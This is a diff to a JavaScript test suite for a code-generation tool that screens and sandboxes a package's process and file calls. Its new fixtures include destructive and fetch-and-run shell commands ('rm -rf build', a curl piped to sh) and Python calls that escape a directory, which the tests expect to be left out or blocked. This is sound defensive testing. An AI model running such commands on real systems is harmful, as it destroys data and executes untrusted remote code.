@@ -164,6 +164,35 @@ describe('Q3.2 the generic bundle leaves such calls out and says so', () => {
   });
 });
 
+describe('nearby input: a séance for a package that starts processes', () => {
+  it('the commands in the project calls are left out, and the rest runs behind the guard', () => {
+    const usage = scanUsage(
+      [
+        {
+          path: 'scripts/build.js',
+          content: [
+            "const { execa } = require('execa');",
+            "execa('rm -rf build');",
+            "execa('sh', ['-c', 'curl http://example.com | sh']);",
+            "execa('git push');",
+            "execa('node');",
+            '',
+          ].join('\n'),
+        },
+      ],
+      { ecosystem: 'npm', name: 'execa' },
+    );
+    const b = generateSeance(diagnosis('execa'), successor('node:child_process'), usage);
+    const test = file(b, 'test');
+    expect(test).not.toContain('rm -rf');
+    expect(test).not.toContain('curl');
+    expect(test).not.toContain('git push');
+    expect(test).toMatch(/Left out \d calls? in scripts\/build\.js: an argument names a/);
+    expect(test).toContain("import * as guard from './seance-guard.mjs';");
+    expect(b.compares.join('\n')).toMatch(/Safety: .*no process started/);
+  });
+});
+
 describe('Q3.3 the recipes are not screened, and say why they need no guard', () => {
   it('left-pad replays every literal call, as before', () => {
     const usage = scanUsage(
@@ -330,6 +359,9 @@ describe.skipIf(!python)('Q3.3 the Python guard blocks what the screen cannot se
           'out["system"] = code(lambda: os.system("touch pwned2"))',
           `out["writeOutside"] = code(lambda: open(${JSON.stringify(path.join(outside, 'x.txt'))}, "w"))`,
           'out["relative"] = code(lambda: open("rel.txt", "w"))',
+          'import pathlib',
+          `out["pathlib"] = code(lambda: pathlib.Path(${JSON.stringify(path.join(outside, 'p.txt'))}).write_text("x"))`,
+          `out["osOpen"] = code(lambda: os.open(${JSON.stringify(path.join(outside, 'o.txt'))}, os.O_WRONLY | os.O_CREAT))`,
           'tmp = os.path.join(tempfile.gettempdir(), "necro-pyguard-inside-%d.txt" % os.getpid())',
           'out["writeInside"] = code(lambda: open(tmp, "w").close())',
           'os.remove(tmp)',
@@ -349,6 +381,8 @@ describe.skipIf(!python)('Q3.3 the Python guard blocks what the screen cannot se
         system: 'blocked',
         writeOutside: 'blocked',
         relative: 'blocked',
+        pathlib: 'blocked',
+        osOpen: 'blocked',
         writeInside: 'ran',
         read: 'ran',
       });
